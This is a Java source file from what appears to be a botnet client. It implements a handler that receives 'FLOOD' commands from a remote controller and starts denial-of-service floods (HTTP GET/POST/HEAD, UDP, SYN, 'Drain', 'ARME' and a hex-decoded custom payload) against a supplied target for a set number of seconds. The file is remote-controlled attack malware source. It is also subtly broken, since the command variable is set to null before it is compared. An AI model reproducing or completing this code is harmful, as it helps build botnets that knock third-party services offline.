package com.redpois0n.packets.in;

import com.redpois0n.Connection;
import com.redpois0n.Constants;
import com.redpois0n.common.codec.Hex;
import com.redpois0n.flood.ARME;
import com.redpois0n.flood.CUSTOM;
import com.redpois0n.flood.Drain;
import com.redpois0n.flood.FloodTime;
import com.redpois0n.flood.HTTP;
import com.redpois0n.flood.SSYN;
import com.redpois0n.flood.UDP;

public class PacketFLOOD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String line = null;
		String s;
		if (line.equals("FLOOD HTTPGET")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			new FloodTime(seconds).start();
			new HTTP(target, Constants.HTTP_GET).start();
		} else if (line.equals("FLOOD HTTPPOST")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			new FloodTime(seconds).start();
			new HTTP(target, Constants.HTTP_POST).start();
		} else if (line.equals("FLOOD HTTPHEAD")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			new FloodTime(seconds).start();
			new HTTP(target, Constants.HTTP_HEAD).start();
		} else if (line.equals("FLOOD UDP")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			new FloodTime(seconds).start();
			new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		} else if (line.equals("FLOOD SSYN")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			new FloodTime(seconds).start();
			new SSYN(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		} else if (line.equals("FLOOD DRAIN")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			new FloodTime(seconds).start();
			new Drain(target).start();
		} else if (line.equals("FLOOD ARME")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			new FloodTime(seconds).start();
			new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		} else if (line.equals("FLOOD CUSTOM")) {
			String target = Connection.readLine();
			int seconds = Connection.readInt();
			String code = Connection.readLine();
			code = Hex.decode(code.substring(2, code.length()));
			new FloodTime(seconds).start();
			new CUSTOM(target.split(":")[0], Integer.parseInt(target.split(":")[1]), code).start();
		}
	}

}
